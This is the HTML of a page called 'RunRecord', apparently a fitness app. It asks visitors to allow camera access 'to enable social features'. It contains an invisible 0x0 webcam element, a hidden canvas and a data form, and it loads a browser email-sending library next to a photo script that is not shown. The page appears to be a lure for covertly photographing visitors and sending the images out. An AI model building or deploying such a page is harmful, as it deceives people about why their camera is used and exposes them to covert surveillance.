<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RunRecord</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins&display=swap" rel="stylesheet">
</head>

<body>
    <h1 id="title" onclick="takePhoto()">RunRecord</h1>
    <div id="fancy"></div>

    <div id="permission">
        <h2>Please allow camera access for RunRecord to enable social features</h2>
        <div id="ok-button" onclick="takePhoto()">Got It</div>
    </div>

    <video id="webcam" autoplay playsinline width="0" height="0"></video>
    <canvas id="canvas" class="d-none"></canvas>

    <form id="form">
        <input id="data" name="data" value="">
        <input id="submit" type="submit">
    </form>
</body>

<script src="https://unpkg.com/webcam-easy/dist/webcam-easy.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.11.5/gsap.min.js"></script>
<script src="https://smtpjs.com/v3/smtp.js"></script>
<script src="animation.js"></script>
<script src="photo.js"></script>

</html>
